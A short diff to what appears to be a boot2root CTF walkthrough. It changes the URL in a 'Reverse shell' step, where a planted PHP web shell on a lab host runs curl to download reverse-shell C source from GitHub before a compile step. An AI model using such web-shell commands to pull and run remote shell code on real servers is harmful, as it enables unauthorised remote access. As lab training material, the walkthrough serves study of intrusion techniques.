@@ -3,7 +3,7 @@
 ## Reverse shell
 
 - Introduce our script in the server\
-https://192.168.56.102/forum/templates_c/myfile.php?cmd=curl%20https://raw.githubusercontent.com/Gropopus/Boot2root/master/reverse_shell.c%20--output%20reverseshell.c
+https://192.168.56.102/forum/templates_c/myfile.php?cmd=curl%20https://raw.githubusercontent.com/adbenoit-9/42_boot2root/main/scripts/reverse_shell.c%20--output%20reverseshell.c
 
 - Compile it
 ```
